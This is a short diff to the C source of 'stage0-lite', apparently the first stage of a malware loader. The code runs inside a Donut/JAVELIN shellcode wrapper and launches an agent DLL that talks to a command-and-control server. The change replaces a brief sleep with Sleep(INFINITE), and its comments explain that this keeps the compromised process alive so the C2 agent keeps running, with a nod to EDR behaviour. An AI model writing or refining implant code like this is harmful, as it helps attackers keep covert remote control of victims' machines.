@@ -105,13 +105,18 @@ int stage0_lite_main(void) {
     }
 
     /*
-     * Stage0-lite is done.  The agent thread is running independently.
-     * Return 0 to let JAVELIN/Donut wrapper clean up this thread.
+     * Stage0-lite is done. The agent DLL is now running in its own thread.
+     * We must NOT return here — doing so would unwind JAVELIN → ESTER →
+     * ExitProcess, which kills the agent thread along with the process.
      *
-     * Sleep briefly to give the agent thread time to initialize before
-     * our thread exits (avoids process teardown race on some EDRs).
+     * Sleep(INFINITE) keeps this thread (and thus the process) alive
+     * while the agent communicates with C2 independently.
      */
-    Sleep(500);
+#ifdef STAGE0_CONSOLE
+    printf("[STAGE0] Agent running. Sleeping forever to keep process alive.\n");
+    fflush(stdout);
+#endif
+    Sleep(INFINITE);
     return 0;
 }
 
